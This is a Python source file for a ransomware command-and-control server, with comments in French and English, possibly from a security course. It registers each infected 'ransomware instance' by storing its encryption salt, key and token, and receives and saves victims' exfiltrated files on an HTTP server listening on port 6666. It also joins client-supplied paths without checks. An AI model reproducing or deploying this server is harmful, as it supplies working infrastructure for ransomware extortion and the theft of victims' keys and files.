import base64
from hashlib import sha256
from http.server import HTTPServer
import os
from xorcrypt import xorfile
from pathlib import Path
from cncbase import CNCBase



class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"
    #RANSOMWARE_PATH = "/root/dist"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict) -> dict:
        # used to register new ransomware instance
        # local handling of function parameters/data
        # The directory label is passed as a url parameter (hash of the token)
        label = params['label']
        # salt, key et token sont sauvegardé localement
        salt = body['salt']
        key = body['key']
        token = body['token']

        # nouveau chemin du route
        new_path = f"{CNC.ROOT_PATH}/{label}"

    
        # creation d'un nouveau fichier
        Path(new_path).mkdir(parents=True, exist_ok=False)
    
        self.save_b64(label, salt, 'salt.bin')
        self.save_b64(label, key, 'key.bin')
        self.save_b64(label, token, 'token.bin')

        return {"status":"OK"}

    

    

    def post_file(self, path: str, params: dict, body: dict) -> dict:
        # Fonction pour sauvegarder les fichier de la victime sur le serveur
        token = params["token"]
        file_data = body["file_data"]
        file_name = body["file_name"]
        # Retire le caractère de séparation de chemin initial
        original_path = body["original_path"][1:]

        # Crée le chemin du dossier pour les fichier
        token_dir = os.path.join(self.ROOT_PATH, token, "file", original_path)
        os.makedirs(token_dir, exist_ok=True)

        # Crée le chemin du fichier
        file_path = os.path.join(token_dir, file_name)
        # Ouvre et écrit les données décodées en Base64 dans le fichier
        with open(file_path, "wb") as f:
            f.write(base64.b64decode(file_data))

        return {"status": "OK"}
    
    


           
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()